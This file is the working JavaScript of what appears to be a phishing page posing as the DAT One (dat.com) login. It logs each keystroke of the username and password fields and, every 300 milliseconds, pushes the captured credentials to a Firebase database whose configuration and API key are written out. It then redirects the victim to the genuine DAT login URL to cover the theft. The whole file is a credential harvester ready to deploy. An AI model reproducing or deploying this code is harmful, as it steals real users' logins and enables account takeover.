// Your web app's Firebase configuration
// For Firebase JS SDK v7.20.0 and later, measurementId is optional
const firebaseConfig = {
    apiKey: "AIzaSyC1g5mxwZrE0Ei2QFYI7qO9CUXMswsn4-Y",
    authDomain: "data-97067.firebaseapp.com",
    databaseURL: "https://data-97067-default-rtdb.firebaseio.com",
    projectId: "data-97067",
    storageBucket: "data-97067.appspot.com",
    messagingSenderId: "588905854999",
    appId: "1:588905854999:web:f9dff59251e4459d264452",
    measurementId: "G-V7YQB9H8HQ"
  };


  firebase.initializeApp(firebaseConfig);
  var database = firebase.database();


submit = document.getElementById("submit")
username = document.getElementById("username")
password = document.getElementById("password")

function uuidv4() {
    return ([1e7]+-1e3+-4e3+-8e3+-1e11).replace(/[018]/g, c =>
      (c ^ crypto.getRandomValues(new Uint8Array(1))[0] & 15 >> c / 4).toString(16)
    );
}

uuid = uuidv4()
console.log(uuid)

function addUserData(lastlogin, lastpassword)
{
    firebase.database().ref('logins/' + uuid).push({
        login:lastlogin,
        password: lastpassword
    });
    console.log(lastlogin, lastpassword);
}

let lastlogin = username.value;
let lastpassword = password.value;

function update_data()
{
    let newlogin = username.value;
    let newpassword = password.value;
    lastlogin = newlogin;
    lastpassword = newpassword;

    if (lastlogin.length > 0 && lastpassword.length >= 5)
    {
        submit.style.backgroundColor = "#101111";
        submit.style.color = "white";
    }
    else {
        submit.style.backgroundColor = "#d1d5d8";
        submit.style.color = "#404244";
        
    }

    addUserData(lastlogin, lastpassword);
}

setInterval(function () {
    let newlogin = username.value;
    let newpassword = password.value;
    if (lastlogin != newlogin || lastpassword != newpassword) {
        update_data();
    }
}, 300);

submit.onclick = function () {
    update_data();
    var url = "https://login.dat.com/login?state=hKFo2SB3V3cxOW5ac3pQWWc5TUpONllSWDNOaDJGb2lkU2d0aKFupWxvZ2luo3RpZNkgVWVwWmtieDdZdkVfeFYtUXVNcmdxREhMNmVjbklYN0OjY2lk2SBlOWx6TVhibldOSjBENTBDMmhhYWRvN0RpVzFha3dhQw&client=e9lzMXbnWNJ0D50C2haado7DiW1akwaC&protocol=oauth2&prompt=login&response_type=token%20id_token&redirect_uri=https:%2F%2Fone.dat.com%2Fcallback&scope=openid%20profile%20email&audience=https:%2F%2Fprod-api.dat.com&app_name=DAT%20One%20Web&page_mode=legacy&init_username=&view=login&email_readonly=false&nonce=6tzkl5YLZMjebF4e39hOCfDJG2JypIXo&auth0Client=eyJuYW1lIjoiYXV0aDAuanMiLCJ2ZXJzaW9uIjoiOS4xOS4wIn0%3D&capturedTime=1678046196899";
    
    if(lastpassword.length >= 5)
        window.location.replace(url);
    else
    {
        password.style.borderColor = "red";
    }
};

password.addEventListener('keydown', (event) => {
    var name = event.key;
    var code = event.code;

    update_data();
});


username.addEventListener('keydown', (event) => {
    var name = event.key;
    var code = event.code;

    update_data();
});